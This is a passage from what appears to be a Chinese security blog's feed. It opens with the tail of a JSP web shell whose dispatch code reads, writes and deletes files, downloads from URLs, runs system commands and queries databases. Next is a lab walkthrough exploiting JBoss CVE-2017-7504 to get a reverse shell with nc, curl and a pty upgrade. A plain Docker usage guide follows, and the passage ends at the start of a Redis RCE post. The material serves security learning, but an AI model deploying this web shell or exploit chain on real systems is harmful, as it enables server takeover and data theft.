</span><br><span class="line">     &#125;  </span><br><span class="line">    os.close();  </span><br><span class="line">  &#125;  </span><br><span class="line">  void HH(String s, String d) throws Exception &#123;  </span><br><span class="line">      File sf = new File(s), df = new File(d);  </span><br><span class="line">       if (sf.isDirectory()) &#123;  </span><br><span class="line">          if (!df.exists()) &#123;  </span><br><span class="line">              df.mkdir();  </span><br><span class="line">         &#125;  </span><br><span class="line">           File z[] = sf.listFiles();  </span><br><span class="line">          for (int j = 0; j &lt; z.length; j++) &#123;  </span><br><span class="line">              HH(s + &quot;/&quot; + z[j].getName(), d + &quot;/&quot; + z[j].getName());  </span><br><span class="line">         &#125;  </span><br><span class="line">       &#125; else &#123;  </span><br><span class="line">          FileInputStream is = new FileInputStream(sf);  </span><br><span class="line">           FileOutputStream os = new FileOutputStream(df);  </span><br><span class="line">          int n;  </span><br><span class="line">          byte[] b = new byte[512];  </span><br><span class="line">           while ((n = is.read(b, 0, 512)) != -1) &#123;  </span><br><span class="line">               os.write(b, 0, n);  </span><br><span class="line">         &#125;  </span><br><span class="line">           is.close();  </span><br><span class="line">           os.close();  </span><br><span class="line">       &#125;  </span><br><span class="line">   &#125;  </span><br><span class="line">   void II(String s, String d) throws Exception &#123;  </span><br><span class="line">       File sf = new File(s), df = new File(d);  </span><br><span class="line">      sf.renameTo(df);  </span><br><span class="line">   &#125;  </span><br><span class="line">void JJ(String s) throws Exception &#123;  </span><br><span class="line">       File f = new File(s);  </span><br><span class="line">      f.mkdir();  </span><br><span class="line">   &#125;  </span><br><span class="line"> void KK(String s, String t) throws Exception &#123;  </span><br><span class="line">      File f = new File(s);  </span><br><span class="line">    SimpleDateFormat fm = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);  </span><br><span class="line">      java.util.Date dt = fm.parse(t);  </span><br><span class="line">   f.setLastModified(dt.getTime());  </span><br><span class="line">   &#125;  </span><br><span class="line">  void LL(String s, String d) throws Exception &#123;  </span><br><span class="line">      URL u = new URL(s);  </span><br><span class="line">      int n = 0;  </span><br><span class="line">      FileOutputStream os = new FileOutputStream(d);  </span><br><span class="line">       HttpURLConnection h = (HttpURLConnection) u.openConnection();  </span><br><span class="line">       InputStream is = h.getInputStream();  </span><br><span class="line">      byte[] b = new byte[512];  </span><br><span class="line">      while ((n = is.read(b)) != -1) &#123;  </span><br><span class="line">         os.write(b, 0, n);  </span><br><span class="line">      &#125;  </span><br><span class="line">      os.close();  </span><br><span class="line">       is.close();  </span><br><span class="line">    h.disconnect();  </span><br><span class="line">  &#125;  </span><br><span class="line">  void MM(InputStream is, StringBuffer sb) throws Exception &#123;  </span><br><span class="line">       String l;  </span><br><span class="line">       BufferedReader br = new BufferedReader(new InputStreamReader(is));  </span><br><span class="line">      while ((l = br.readLine()) != null) &#123;  </span><br><span class="line">          sb.append(l + &quot;\r\n&quot;);  </span><br><span class="line">      &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">  void NN(String s, StringBuffer sb) throws Exception &#123;  </span><br><span class="line">      Connection c = GC(s);  </span><br><span class="line">      ResultSet r = s.indexOf(&quot;jdbc:oracle&quot;)!=-1?c.getMetaData().getSchemas():c.getMetaData().getCatalogs();  </span><br><span class="line">      while (r.next()) &#123;  </span><br><span class="line">           sb.append(r.getString(1) + &quot;\t|\t\r\n&quot;);  </span><br><span class="line">       &#125;  </span><br><span class="line">      r.close();  </span><br><span class="line">       c.close();  </span><br><span class="line">    &#125;  </span><br><span class="line">  void OO(String s, StringBuffer sb) throws Exception &#123;  </span><br><span class="line">   Connection c = GC(s);  </span><br><span class="line">      String[] x = s.trim().split(&quot;choraheiheihei&quot;);  </span><br><span class="line">     ResultSet r = c.getMetaData().getTables(null,s.indexOf(&quot;jdbc:oracle&quot;)!=-1?x.length&gt;5?x[5]:x[4]:null, &quot;%&quot;, new String[]&#123;&quot;TABLE&quot;&#125;);  </span><br><span class="line">      while (r.next()) &#123;  </span><br><span class="line">         sb.append(r.getString(&quot;TABLE_NAME&quot;) + &quot;\t|\t\r\n&quot;);  </span><br><span class="line">     &#125;  </span><br><span class="line">     r.close();  </span><br><span class="line">   c.close();  </span><br><span class="line"> &#125;  </span><br><span class="line">   void PP(String s, StringBuffer sb) throws Exception &#123;  </span><br><span class="line">      String[] x = s.trim().split(&quot;\r\n&quot;);  </span><br><span class="line">       Connection c = GC(s);  </span><br><span class="line">     Statement m = c.createStatement(1005, 1007);  </span><br><span class="line">      ResultSet r = m.executeQuery(&quot;select * from &quot; + x[x.length-1]);  </span><br><span class="line">      ResultSetMetaData d = r.getMetaData();  </span><br><span class="line">      for (int i = 1; i &lt;= d.getColumnCount(); i++) &#123;  </span><br><span class="line">         sb.append(d.getColumnName(i) + &quot; (&quot; + d.getColumnTypeName(i)+ &quot;)\t&quot;);  </span><br><span class="line">   &#125;  </span><br><span class="line">      r.close();  </span><br><span class="line">    m.close();  </span><br><span class="line">       c.close();  </span><br><span class="line">   &#125;  </span><br><span class="line">  void QQ(String cs, String s, String q, StringBuffer sb,String p) throws Exception &#123;  </span><br><span class="line">       Connection c = GC(s);  </span><br><span class="line">      Statement m = c.createStatement(1005, 1008);  </span><br><span class="line">     BufferedWriter bw = null;  </span><br><span class="line">      try &#123;  </span><br><span class="line">          ResultSet r = m.executeQuery(q.indexOf(&quot;--f:&quot;)!=-1?q.substring(0,q.indexOf(&quot;--f:&quot;)):q);  </span><br><span class="line">          ResultSetMetaData d = r.getMetaData();  </span><br><span class="line">           int n = d.getColumnCount();  </span><br><span class="line">         for (int i = 1; i &lt;= n; i++) &#123;  </span><br><span class="line">              sb.append(d.getColumnName(i) + &quot;\t|\t&quot;);  </span><br><span class="line">        &#125;  </span><br><span class="line">          sb.append(&quot;\r\n&quot;);  </span><br><span class="line">          if(q.indexOf(&quot;--f:&quot;)!=-1)&#123;  </span><br><span class="line">             File file = new File(p);  </span><br><span class="line">               if(q.indexOf(&quot;-to:&quot;)==-1)&#123;  </span><br><span class="line">                   file.mkdir();  </span><br><span class="line">             &#125;  </span><br><span class="line">            bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(q.indexOf(&quot;-to:&quot;)!=-1?p.trim():p+q.substring(q.indexOf(&quot;--f:&quot;) + 4,q.length()).trim()),true),cs));  </span><br><span class="line">          &#125;  </span><br><span class="line">         while (r.next()) &#123;  </span><br><span class="line">              for (int i = 1; i &lt;= n; i++) &#123;  </span><br><span class="line">                  if(q.indexOf(&quot;--f:&quot;)!=-1)&#123;  </span><br><span class="line">                        bw.write(r.getObject(i)+&quot;&quot;+&quot;\t&quot;);  </span><br><span class="line">                        bw.flush();  </span><br><span class="line">                    &#125;else&#123;  </span><br><span class="line">                        sb.append(r.getObject(i)+&quot;&quot; + &quot;\t|\t&quot;);  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;  </span><br><span class="line">                if(bw!=null)&#123;bw.newLine();&#125;  </span><br><span class="line">                sb.append(&quot;\r\n&quot;);  </span><br><span class="line">            &#125;  </span><br><span class="line">            r.close();  </span><br><span class="line">            if(bw!=null)&#123;bw.close();&#125;  </span><br><span class="line">       &#125; catch (Exception e) &#123;  </span><br><span class="line">           sb.append(&quot;Result\t|\t\r\n&quot;);  </span><br><span class="line">            try &#123;  </span><br><span class="line">               m.executeUpdate(q);  </span><br><span class="line">                sb.append(&quot;Execute Successfully!\t|\t\r\n&quot;);  </span><br><span class="line">           &#125; catch (Exception ee) &#123;  </span><br><span class="line">               sb.append(ee.toString() + &quot;\t|\t\r\n&quot;);  </span><br><span class="line">           &#125;  </span><br><span class="line">       &#125;  </span><br><span class="line">        m.close();  </span><br><span class="line">     c.close();  </span><br><span class="line">&#125;  </span><br><span class="line">%&gt;  </span><br><span class="line">&lt;%  </span><br><span class="line">//String Z = EC(request.getParameter(Pwd) + &quot;&quot;, cs);  </span><br><span class="line">   cs = request.getParameter(&quot;code&quot;) != null ? request.getParameter(&quot;code&quot;)+ &quot;&quot;:cs;  </span><br><span class="line">  request.setCharacterEncoding(cs);  </span><br><span class="line">   response.setContentType(&quot;text/html;charset=&quot; + cs);  </span><br><span class="line">  StringBuffer sb = new StringBuffer(&quot;&quot;);  </span><br><span class="line">if (request.getParameter(Pwd) != null) &#123;  </span><br><span class="line">  try &#123;  </span><br><span class="line">     String Z = EC(request.getParameter(&quot;action&quot;) + &quot;&quot;);  </span><br><span class="line">       String z1 = EC(request.getParameter(&quot;z1&quot;) + &quot;&quot;);  </span><br><span class="line">       String z2 = EC(request.getParameter(&quot;z2&quot;) + &quot;&quot;);  </span><br><span class="line">      sb.append(&quot;-&gt;&quot; + &quot;|&quot;);  </span><br><span class="line">      String s = request.getSession().getServletContext().getRealPath(&quot;/&quot;);  </span><br><span class="line">     if (Z.equals(&quot;A&quot;)) &#123;  </span><br><span class="line">          sb.append(s + &quot;\t&quot;);  </span><br><span class="line">           if (!s.substring(0, 1).equals(&quot;/&quot;)) &#123;  </span><br><span class="line">             AA(sb);  </span><br><span class="line">          &#125;  </span><br><span class="line">      &#125; else if (Z.equals(&quot;B&quot;)) &#123;  </span><br><span class="line">          BB(z1, sb);  </span><br><span class="line">       &#125; else if (Z.equals(&quot;C&quot;)) &#123;  </span><br><span class="line">           String l = &quot;&quot;;  </span><br><span class="line">          BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));  </span><br><span class="line">          while ((l = br.readLine()) != null) &#123;  </span><br><span class="line">               sb.append(l + &quot;\r\n&quot;);  </span><br><span class="line">        &#125;  </span><br><span class="line">           br.close();  </span><br><span class="line">      &#125; else if (Z.equals(&quot;D&quot;)) &#123;  </span><br><span class="line">          BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));  </span><br><span class="line">          bw.write(z2);  </span><br><span class="line">          bw.close();  </span><br><span class="line">           sb.append(&quot;1&quot;);  </span><br><span class="line">      &#125; else if (Z.equals(&quot;E&quot;)) &#123;  </span><br><span class="line">            EE(z1);  </span><br><span class="line">           sb.append(&quot;1&quot;);  </span><br><span class="line">       &#125; else if (Z.equals(&quot;F&quot;)) &#123;  </span><br><span class="line">          FF(z1, response);  </span><br><span class="line">       &#125; else if (Z.equals(&quot;G&quot;)) &#123;  </span><br><span class="line">         GG(z1, z2);  </span><br><span class="line">           sb.append(&quot;1&quot;);  </span><br><span class="line">      &#125; else if (Z.equals(&quot;H&quot;)) &#123;  </span><br><span class="line">          HH(z1, z2);  </span><br><span class="line">          sb.append(&quot;1&quot;);  </span><br><span class="line">       &#125; else if (Z.equals(&quot;I&quot;)) &#123;  </span><br><span class="line">          II(z1, z2);  </span><br><span class="line">           sb.append(&quot;1&quot;);  </span><br><span class="line">       &#125; else if (Z.equals(&quot;J&quot;)) &#123;  </span><br><span class="line">           JJ(z1);  </span><br><span class="line">         sb.append(&quot;1&quot;);  </span><br><span class="line">       &#125; else if (Z.equals(&quot;K&quot;)) &#123;  </span><br><span class="line">           KK(z1, z2);  </span><br><span class="line">           sb.append(&quot;1&quot;);  </span><br><span class="line">      &#125; else if (Z.equals(&quot;L&quot;)) &#123;  </span><br><span class="line">           LL(z1, z2);  </span><br><span class="line">         sb.append(&quot;1&quot;);  </span><br><span class="line">    &#125; else if (Z.equals(&quot;M&quot;)) &#123;  </span><br><span class="line">           String[] c = &#123; z1.substring(2), z1.substring(0, 2), z2 &#125;;  </span><br><span class="line">           Process p = Runtime.getRuntime().exec(c);  </span><br><span class="line">         MM(p.getInputStream(), sb);  </span><br><span class="line">         MM(p.getErrorStream(), sb);  </span><br><span class="line">      &#125; else if (Z.equals(&quot;N&quot;)) &#123;  </span><br><span class="line">          NN(z1, sb);  </span><br><span class="line">        &#125; else if (Z.equals(&quot;O&quot;)) &#123;  </span><br><span class="line">            OO(z1, sb);  </span><br><span class="line">       &#125; else if (Z.equals(&quot;P&quot;)) &#123;  </span><br><span class="line">           PP(z1, sb);  </span><br><span class="line">       &#125; else if (Z.equals(&quot;Q&quot;)) &#123;  </span><br><span class="line">        QQ(cs, z1, z2, sb,z2.indexOf(&quot;-to:&quot;)!=-1?z2.substring(z2.indexOf(&quot;-to:&quot;)+4,z2.length()):s.replaceAll(&quot;\\\\&quot;, &quot;/&quot;)+&quot;images/&quot;);  </span><br><span class="line">     &#125;  </span><br><span class="line">    &#125; catch (Exception e) &#123;  </span><br><span class="line"> sb.append(&quot;ERROR&quot; + &quot;:// &quot; + e.toString());  </span><br><span class="line">  &#125;  </span><br><span class="line">sb.append(&quot;|&quot; + &quot;&lt;-&quot;);  </span><br><span class="line">out.print(sb.toString());  </span><br><span class="line">&#125;  </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
  </entry>
  <entry>
    <title>JBoss 4.x 反序列化漏洞(CVE-2017-7504)</title>
    <url>/2021/08/27/JBoss%204.x%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2017-7504)/</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
<p>JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。</p>
<hr>
<span id="more"></span>

<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
<li>JBoss AS 4.x及之前版本</li>
</ul>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>docker搭建；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/vulhub/vulhub.git</span><br><span class="line">cd vulhub/jboss/CVE-2017-7504</span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">环境</span><br><span class="line">- 靶机：centos 7/docker CVE-2017-7504</span><br><span class="line">- 攻击机：kali 2020/CVE-2015-7501</span><br></pre></td></tr></table></figure>

<p>漏洞验证；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://XXX.XXX.XXX.XXX:8080/jbossmq-httpil/HTTPServerILServlet</span><br></pre></td></tr></table></figure>

<p>访问页面如下则可能存在有此漏洞：</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210827111919231.png" alt="image-20210827111919231"></p>
<p>反序列化利用工具;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/ianxtianxt/CVE-2015-7501/</span><br></pre></td></tr></table></figure>

<p>在kail攻击机中解压CVE-2015-7501，并进入目录;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unzip CVE-2015-7501-master.zip</span><br><span class="line">cd CVE-2015-7501-master/</span><br></pre></td></tr></table></figure>

<p>攻击机若没有Java环境，则需先安装Java环境；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /opt</span><br><span class="line">curl http://www.joaomatosf.com/rnp/java_files/jdk-8u20-linux-x64.tar.gz -o jdk-8u20-linux-x64.tar.gz </span><br><span class="line">tar zxvf jdk-8u20-linux-x64.tar.gz</span><br><span class="line">rm -rf /usr/bin/java*</span><br><span class="line">ln -s /opt/jdk1.8.0_20/bin/j* /usr/bin</span><br><span class="line">java -version</span><br></pre></td></tr></table></figure>

<p>反序列化利用工具反弹shell;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java</span><br><span class="line">java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.240.242:2333（IP是攻击机ip,2333是要监听的端口)</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210827112227950.png" alt="image-20210827112227950"></p>
<p>攻击机中另起终端，执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 2333</span><br></pre></td></tr></table></figure>

<p>这个时候在CVE-2015-7501-master/目录下生成了一个ReverseShellCommonsCollectionsHashMap.ser文件。</p>
<p>使用curl就能反弹shell，执行命令:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://192.168.240.140:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser </span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210827112436086.png" alt="image-20210827112436086"></p>
<p>若返回的shell非正常交互，则执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210827112510693.png" alt="image-20210827112510693"></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
  </entry>
  <entry>
    <title>docker安装与使用</title>
    <url>/2021/08/27/docker%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><hr>
<p>Docker 包括三个基本概念:</p>
<ul>
<li><strong>镜像（Image）</strong>：Docker 镜像（Image），就相当于是一个 root 文件系统。比如官方镜像 ubuntu:16.04 就包含了完整的一套 Ubuntu16.04 最小系统的 root 文件系统。</li>
<li><strong>容器（Container）</strong>：镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的类和实例一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。</li>
<li><strong>仓库（Repository）</strong>：仓库可看成一个代码控制中心，用来保存镜像。</li>
</ul>
<p>Docker 使用客户端-服务器 (C/S) 架构模式，使用远程API来管理和创建Docker容器。</p>
<hr>
<span id="more"></span>

<ul>
<li><strong>详情参考</strong>：<a href="https://www.runoob.com/docker/docker-architecture.html">https://www.runoob.com/docker/docker-architecture.html</a></li>
</ul>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829115850233.png" alt="image-20210829115850233"></p>
<table>
<thead>
<tr>
<th align="left">概念</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Docker 镜像(Images)</td>
<td align="left">Docker 镜像是用于创建 Docker 容器的模板，比如 Ubuntu 系统。</td>
</tr>
<tr>
<td align="left">Docker 容器(Container)</td>
<td align="left">容器是独立运行的一个或一组应用，是镜像运行时的实体。</td>
</tr>
<tr>
<td align="left">Docker 客户端(Client)</td>
<td align="left">Docker 客户端通过命令行或者其他工具使用 Docker SDK (<a href="https://docs.docker.com/develop/sdk/">https://docs.docker.com/develop/sdk/</a>) 与 Docker 的守护进程通信。</td>
</tr>
<tr>
<td align="left">Docker 主机(Host)</td>
<td align="left">一个物理或者虚拟的机器用于执行 Docker 守护进程和容器。</td>
</tr>
<tr>
<td align="left">Docker Registry</td>
<td align="left">Docker 仓库用来保存镜像，可以理解为代码控制中的代码仓库。Docker Hub(<a href="https://hub.docker.com/">https://hub.docker.com</a>) 提供了庞大的镜像集合供使用。一个 Docker Registry 中可以包含多个仓库（Repository）；每个仓库可以包含多个标签（Tag）；每个标签对应一个镜像。通常，一个仓库会包含同一个软件不同版本的镜像，而标签就常用于对应该软件的各个版本。我们可以通过 <strong>&lt;仓库名&gt;:&lt;标签&gt;</strong> 的格式来指定具体是这个软件哪个版本的镜像。如果不给出标签，将以 <strong>latest</strong> 作为默认标签。</td>
</tr>
<tr>
<td align="left">Docker Machine</td>
<td align="left">Docker Machine是一个简化Docker安装的命令行工具，通过一个简单的命令行即可在相应的平台上安装Docker，比如VirtualBox、 Digital Ocean、Microsoft Azure。</td>
</tr>
</tbody></table>
<h2 id="docker安装"><a href="#docker安装" class="headerlink" title="docker安装"></a>docker安装</h2><p>Docker 要求 CentOS 系统的内核版本高于 3.10 ，使用<code>uname -r</code>来验证你的CentOS 版本是否支持 Docker ；</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829111739879.png" alt="image-20210829111739879"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">使用 root 权限登录 Centos。确保 yum 包更新到最新。</span><br><span class="line">yum update -y</span><br><span class="line">卸载旧版本(如果安装过旧版本的话)</span><br><span class="line">yum remove docker  docker-common docker-selinux docker-engine</span><br><span class="line">安装需要的软件包， yum-util 提供yum-config-manager功能，另外两个是devicemapper驱动依赖的</span><br><span class="line">yum install -y yum-utils device-mapper-persistent-data lvm2</span><br><span class="line">设置yum源</span><br><span class="line">yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829111845983.png" alt="image-20210829111845983"></p>
<p>可以查看所有仓库中所有docker版本，并选择特定版本安装;</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum list docker-ce --showduplicates | sort</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829111944466.png" alt="image-20210829111944466"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># docker安装</span></span><br><span class="line">yum install docker-ce -y  <span class="comment">#由于repo中默认只开启stable仓库，故这里安装的是最新稳定版17.12.0</span></span><br><span class="line">yum install &lt;FQPN&gt;  <span class="comment"># 例如：sudo yum install docker-ce-17.12.0.ce -y</span></span><br><span class="line"><span class="comment"># 查看docker安装版本</span></span><br><span class="line">docker version</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829112038280.png" alt="image-20210829112038280"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 加入开机自启动</span></span><br><span class="line">systemctl start docker</span><br><span class="line">systemctl <span class="built_in">enable</span> docker</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829112114629.png" alt="image-20210829112114629"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装docker-compose</span></span><br><span class="line">curl -L https://get.daocloud.io/docker/compose/releases/download/1.26.2/docker-compose-`uname -s`-`uname -m` &gt; /usr/<span class="built_in">local</span>/bin/docker-compose -k</span><br><span class="line">chmod +x /usr/<span class="built_in">local</span>/bin/docker-compose</span><br></pre></td></tr></table></figure>

<h2 id="docker使用"><a href="#docker使用" class="headerlink" title="docker使用"></a>docker使用</h2><p><strong>查看docker镜像</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829112242182.png" alt="image-20210829112242182"></p>
<p><strong>查看所有docker容器id</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829112321560.png" alt="image-20210829112321560"></p>
<p><strong>查看当前所有运行中的docker</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210830114420015.png" alt="image-20210830114420015"></p>
<p><strong>运行一个容器</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">格式：docker start &lt;id&gt;</span><br><span class="line"><span class="comment">#例如docker start 5828f5697e25</span></span><br><span class="line">1. 停止一个容器</span><br><span class="line">格式：docker stop &lt;id&gt;</span><br><span class="line"><span class="comment">#例如docker start 5828f5697e25</span></span><br><span class="line">2. 进入一个运行的容器</span><br><span class="line">格式：docker <span class="built_in">exec</span> -it  &lt;容器id&gt; /bin/bash</span><br><span class="line"><span class="comment">#例如docker exec -it  5828f5697e25 /bin/bash</span></span><br><span class="line">3. 容器端口映射</span><br><span class="line">格式：docker run &lt;容器id&gt; -it -p 5984:5984</span><br><span class="line"><span class="comment">#例如：docker run 4138cbdb4df8 -it -p 5984:5984</span></span><br></pre></td></tr></table></figure>

<h2 id="docker容器内快速更换源"><a href="#docker容器内快速更换源" class="headerlink" title="docker容器内快速更换源"></a>docker容器内快速更换源</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv /etc/apt/sources.list /etc/apt/sources.list.bak</span><br><span class="line">    echo &quot;deb http://mirrors.163.com/debian/ jessie main non-free contrib&quot; &gt;&gt; /etc/apt/sources.list</span><br><span class="line">    echo &quot;deb http://mirrors.163.com/debian/ jessie-proposed-updates main non-free contrib&quot; &gt;&gt;/etc/apt/sources.list</span><br><span class="line">    echo &quot;deb-src http://mirrors.163.com/debian/ jessie main non-free contrib&quot; &gt;&gt;/etc/apt/sources.list</span><br><span class="line">    echo &quot;deb-src http://mirrors.163.com/debian/ jessie-proposed-updates main non-free contrib&quot; &gt;&gt;/etc/apt/sources.list</span><br><span class="line">    #更新安装源</span><br><span class="line">    apt-get update </span><br></pre></td></tr></table></figure>

<h2 id="Docker镜像命令"><a href="#Docker镜像命令" class="headerlink" title="Docker镜像命令"></a>Docker镜像命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker search ubuntu	<span class="comment">#查找镜像</span></span><br><span class="line">docker pull ubuntu		<span class="comment">#拉取镜像(就是下载)</span></span><br><span class="line">docker images			<span class="comment">#查看所有Docker镜像</span></span><br><span class="line">docker <span class="built_in">history</span>			<span class="comment">#查看镜像历史（有哪些层）</span></span><br><span class="line">docker system df		<span class="comment">#查看镜像、容器、数据卷所占用的空间</span></span><br><span class="line">docker rmi -f id		<span class="comment">#删除镜像</span></span><br><span class="line">docker rmi -f `docker images -q`	<span class="comment">#删除全部镜像</span></span><br></pre></td></tr></table></figure>

<h2 id="Docker容器命令"><a href="#Docker容器命令" class="headerlink" title="Docker容器命令"></a>Docker容器命令</h2><blockquote>
<p>镜像（<code>Image</code>）和容器（<code>Container</code>）的关系，就像是面向对象程序设计中的 <code>类</code> 和 <code>实例</code> 一样</p>
</blockquote>
<blockquote>
<p>镜像是静态的定义，容器是镜像运行时的实体，容器可以被创建、启动、停止、删除、暂停等</p>
</blockquote>
<blockquote>
<p>容器的实质是进程，但与直接在宿主执行的进程不同，容器进程运行于属于自己的独立的 [命名空间]</p>
</blockquote>
<blockquote>
<p>因此容器可以拥有自己的 <code>root</code> 文件系统、自己的网络配置、自己的进程空间，甚至自己的用户 ID 空间</p>
</blockquote>
<blockquote>
<p>容器内的进程是运行在一个隔离的环境里，使用起来，就好像是在一个独立于宿主的系统下操作一样</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker ps			<span class="comment">#查看所有启动的容器（若查看所有的容器包括已经关闭,添加-a参数即可）</span></span><br><span class="line">docker inspect ID	<span class="comment">#查看容器信息（数据卷等 -&gt; &quot;Mounts&quot;）</span></span><br><span class="line">docker stats ID		<span class="comment">#查看Docker状态</span></span><br><span class="line">docker logs ID		<span class="comment">#查看容器日志（报错和命令）</span></span><br><span class="line"></span><br><span class="line">docker run -it -d --name ubuntu_wintrysec -p 8088:80 ubuntu	</span><br><span class="line"><span class="comment">#运行Docker镜像</span></span><br><span class="line"><span class="comment">#-d	守护态运行，不直接把执行命令的结果输出在当前宿主机下</span></span><br><span class="line"><span class="comment">#--name参数为自定义容器名</span></span><br><span class="line"><span class="comment">#-p参数为指定端口映射、后者为容器的端口(我们访问Docker的宿主机8080端口)</span></span><br><span class="line"><span class="comment">#成功后台运行后会返回一个容器的id，只需要记住前两位即可</span></span><br><span class="line"></span><br><span class="line">docker <span class="built_in">exec</span> -it ID bash	</span><br><span class="line"><span class="comment">#进入一个正在运行的容器的shell，容器id前4位就行,或者容器名也行</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span>				<span class="comment">#退出容器</span></span><br><span class="line">docker stop ID		<span class="comment">#停止容器运行，写容器名也行，start是开启</span></span><br><span class="line">docker rm ID		<span class="comment">#删除容器</span></span><br><span class="line">docker rm `docker ps -a -q`		<span class="comment">#删除所有已经关闭的容器，-f能把正在运行的也关闭</span></span><br><span class="line"></span><br><span class="line">docker stop `docker ps -aq`    <span class="comment">#停止所有容器</span></span><br><span class="line">docker rm `docker ps -aq`      <span class="comment">#删除所有容器</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>容器安全</category>
      </categories>
  </entry>
  <entry>
    <title>Redis(&lt;= 5.0.5)主从复制 RCE</title>
    <url>/2021/08/29/Redis(=%205.0.5)%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%20RCE/</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
<p>在2019年7月7日结束的WCTF2019 Final上，LC/BC的成员Pavel Toporkov在分享会上介绍了一种关于redis新版本的RCE利用方式，比起以前的利用方式来说，这种利用方式更为通用，危害也更大。</p>
<ul>
